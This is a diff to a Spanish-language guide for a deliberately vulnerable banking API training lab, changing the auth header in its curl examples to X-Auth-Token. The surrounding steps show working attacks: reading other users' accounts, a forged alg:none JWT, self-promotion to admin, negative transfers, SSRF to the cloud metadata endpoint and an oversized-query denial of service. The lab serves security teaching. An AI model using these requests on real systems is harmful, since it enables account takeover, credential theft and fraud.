@@ -91,6 +91,9 @@ TOKEN=$(curl -s -X POST $B/auth/login -H 'Content-Type: application/json' \
 echo $TOKEN
 ```
 
+El token se envía siempre en la cabecera **`X-Auth-Token`** (Azure Static Web
+Apps reserva la cabecera `Authorization` para su propio login y la reemplaza).
+
 > En **PowerShell** escribe `curl.exe` (no `curl`) o usa la consola web.
 
 ---
@@ -134,7 +137,7 @@ que lo pide. Basta con cambiar el número en la URL.
 3. Cambia la ruta a `/api/lab/accounts/5002` y envía.
 
 ```bash
-curl -s $B/accounts/5002 -H "Authorization: Bearer $TOKEN"
+curl -s $B/accounts/5002 -H "X-Auth-Token: $TOKEN"
 ```
 
 - **Vulnerable:** `200` con el saldo, IBAN, nombre y email de **Carlos**.
@@ -160,7 +163,7 @@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjEwMDN9.
 2. Método `GET`, ruta `/api/lab/users/me`, enviar.
 
 ```bash
-curl -s $B/users/me -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjEwMDN9."
+curl -s $B/users/me -H "X-Auth-Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjEwMDN9."
 ```
 
 - **Vulnerable:** `200` y eres **admin** sin conocer su contraseña.
@@ -214,7 +217,7 @@ que la app "no muestre" lo sensible.
 **Consola:** atajo **"Mi perfil"** (`GET /api/lab/users/me`).
 
 ```bash
-curl -s $B/users/me -H "Authorization: Bearer $TOKEN"
+curl -s $B/users/me -H "X-Auth-Token: $TOKEN"
 ```
 
 - **Vulnerable:** aparecen `password`, `passwordHash` (MD5 sin sal), `dni` y `pin`.
@@ -233,7 +236,7 @@ envíes, incluido el rol.
 3. Atajo **"Mi perfil"** → enviar y mira `role`.
 
 ```bash
-curl -s -X PATCH $B/users/me -H "Authorization: Bearer $TOKEN" \
+curl -s -X PATCH $B/users/me -H "X-Auth-Token: $TOKEN" \
   -H 'Content-Type: application/json' -d '{"role":"admin"}'
 ```
 
@@ -252,7 +255,7 @@ no que seas administrador.
 **Consola:** inicia sesión como laura (rol cliente) y usa el atajo **"Panel admin"**.
 
 ```bash
-curl -s $B/admin/users -H "Authorization: Bearer $TOKEN"
+curl -s $B/admin/users -H "X-Auth-Token: $TOKEN"
 ```
 
 - **Vulnerable:** `200` con **todos** los usuarios, contraseñas incluidas.
@@ -272,7 +275,7 @@ Carlos en realidad **le quita** 1000 € a él y te los da a ti.
 3. Atajo **"Mi cuenta"** otra vez.
 
 ```bash
-curl -s -X POST $B/transfers -H "Authorization: Bearer $TOKEN" \
+curl -s -X POST $B/transfers -H "X-Auth-Token: $TOKEN" \
   -H 'Content-Type: application/json' \
   -d '{"fromAccountId":5001,"toAccountId":5002,"amount":-1000}'
 ```
@@ -304,7 +307,7 @@ guarda credenciales).
 Prueba también `?url=http://internal-admin.vulnbank.local/`.
 
 ```bash
-curl -s "$B/tools/preview?url=http://169.254.169.254/latest/meta-data/" -H "Authorization: Bearer $TOKEN"
+curl -s "$B/tools/preview?url=http://169.254.169.254/latest/meta-data/" -H "X-Auth-Token: $TOKEN"
 ```
 
 - **Vulnerable:** "credenciales" de la nube (`secretAccessKey`…) y datos de un panel interno.
@@ -402,7 +405,7 @@ de servicio).
 
 ```bash
 curl -s -o /dev/null -w 'HTTP %{http_code} · %{size_download} bytes · %{time_total}s\n' \
-  "$B/accounts/5001/transactions?limit=20000" -H "Authorization: Bearer $TOKEN"
+  "$B/accounts/5001/transactions?limit=20000" -H "X-Auth-Token: $TOKEN"
 ```
 
 - **Vulnerable:** `200` con 20 000 movimientos (varios MB).
@@ -460,6 +463,7 @@ Para la versión endurecida: `node tools/api-lab-server.js clean`. Detener: **Ct
 | Los saldos o el rol quedaron raros | Pulsa **"Restaurar datos"** (`POST /api/lab/reset`). |
 | Los datos vuelven solos al estado inicial | Normal: todo vive en memoria y se reinicia cuando Azure recicla la API. |
 | En la endurecida el token deja de valer de repente | Azure reinició la API y generó un secreto nuevo. Vuelve a iniciar sesión. (Para evitarlo, ver sección 9.) |
+| `401` usando `Authorization: Bearer …` (Postman, curl) | En el sitio publicado usa la cabecera `X-Auth-Token: <token>`. |
 | `curl` en PowerShell da errores raros | Usa `curl.exe` o la consola web. |
 
 ---
